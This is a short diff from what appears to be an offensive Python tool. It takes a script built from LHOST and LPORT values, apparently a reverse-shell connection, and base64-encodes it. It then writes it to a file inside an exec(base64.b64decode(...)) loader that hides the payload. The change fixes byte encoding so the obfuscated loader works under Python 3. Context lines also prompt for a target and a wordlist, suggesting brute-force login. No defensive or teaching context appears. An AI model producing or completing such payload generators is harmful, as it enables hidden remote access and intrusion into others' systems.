@@ -27,11 +27,12 @@ SLogin()
 target = input("Target id : ")
 w = input("wordlist : ")
     """.format(LHOST,LPORT)
-    devil = base64.b64encode(scripts)
+    scripts_e = bytes(scripts, encoding="utf-8")
+    devil = base64.b64encode(scripts_e)
 
     script_to_run = """
 import base64
-exec(base64.b64decode("{0}"))
+exec(base64.b64decode({0}))
     """.format(devil)
     with open(f_name, "w") as f:
         f.write(script_to_run)
